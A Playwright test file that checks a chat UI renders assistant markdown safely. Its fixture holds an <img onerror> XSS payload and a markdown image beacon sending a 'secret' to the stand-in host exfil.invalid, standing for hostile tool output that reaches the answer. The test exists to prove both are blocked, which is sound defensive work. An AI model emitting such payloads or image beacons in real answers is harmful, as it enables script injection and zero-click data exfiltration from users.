/**
 * #98 - assistant messages render sanitized GFM in the live DOM.
 *
 * Complements the fast sanitizer unit tests (src/lib/markdown.test.ts) with a
 * real-browser check: a mocked conversation whose assistant message carries the
 * issue's table plus a hostile "alert title" (tool output is attacker-
 * controlled). Asserts a real <table> renders, no raw pipes remain, no
 * img/script nodes exist, links carry the noopener policy, and crucially that a
 * markdown image fires ZERO network requests (the zero-click exfil channel).
 */
import { expect, test } from '@playwright/test';
import { mockAuthMe } from './helpers';

const CONV_ID = 'c0ffee00-0000-4000-8000-000000000001';

const ASSISTANT_MD = [
	'Here are the tenants:',
	'',
	'| Tenant | Slug | Open Investigations | Max Severity |',
	'|---|---|---|---|',
	'| **Northwind Labs** | `northwind` | 8 | **13** |',
	'| **Demo Tenant** | `demo` | 124 | 12 |',
	'',
	'## Summary',
	'',
	'- `northwind` needs attention',
	'- see [runbook](https://soctalk.ai/runbook)',
	'',
	// Hostile content that reached the answer via a tool call:
	'Flagged log line: <img src=x onerror="window.__pwned=1">',
	'Beacon: ![tracker](https://exfil.invalid/leak?c=secret)'
].join('\n');

const conversation = {
	id: CONV_ID,
	title: 'Fleet check',
	tenant_id: null,
	scope: 'mssp_fleet',
	focused_tenant_id: null,
	focused_tenant_slug: null,
	investigation_id: null,
	model_name: 'claude',
	status: 'active',
	total_dollars: 0,
	created_at: new Date().toISOString(),
	last_message_at: new Date().toISOString()
};

test.describe('Chat markdown rendering (#98)', () => {
	test('assistant message renders sanitized GFM, blocks injection and image beacons', async ({
		page
	}) => {
		await mockAuthMe(page);

		// Fail loudly if any request reaches the image beacon host.
		const beaconHits: string[] = [];
		await page.route('**://exfil.invalid/**', (route) => {
			beaconHits.push(route.request().url());
			return route.abort();
		});

		await page.route('**/api/chat/conversations?*', (route) =>
			route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ items: [conversation] }) })
		);
		await page.route(`**/api/chat/conversations/${CONV_ID}`, (route) =>
			route.fulfill({
				status: 200,
				contentType: 'application/json',
				body: JSON.stringify({
					conversation,
					messages: [
						{
							id: 'm1',
							role: 'assistant',
							content: { text: ASSISTANT_MD },
							created_at: new Date().toISOString()
						}
					]
				})
			})
		);

		await page.goto('/chat');
		await page.getByText('Fleet check').first().click();

		const msg = page.getByTestId('assistant-message').first();
		await expect(msg).toBeVisible({ timeout: 15000 });

		// Formatting: a real table, bold, code, heading — no raw markdown source.
		await expect(msg.locator('table')).toBeVisible();
		await expect(msg.locator('th', { hasText: 'Tenant' })).toBeVisible();
		await expect(msg.locator('strong', { hasText: 'Northwind Labs' })).toBeVisible();
		await expect(msg.locator('h2', { hasText: 'Summary' })).toBeVisible();
		await expect(msg).not.toContainText('|---|');
		await expect(msg).not.toContainText('**Northwind');

		// Sanitizer contract in the live DOM.
		expect(await msg.locator('img').count()).toBe(0);
		expect(await msg.locator('script').count()).toBe(0);
		const link = msg.locator('a', { hasText: 'runbook' });
		await expect(link).toHaveAttribute('rel', /noopener/);
		await expect(link).toHaveAttribute('target', '_blank');

		// The onerror never fired and no beacon request was made.
		expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
		expect(beaconHits, 'no request may reach the image beacon host').toEqual([]);
	});
});
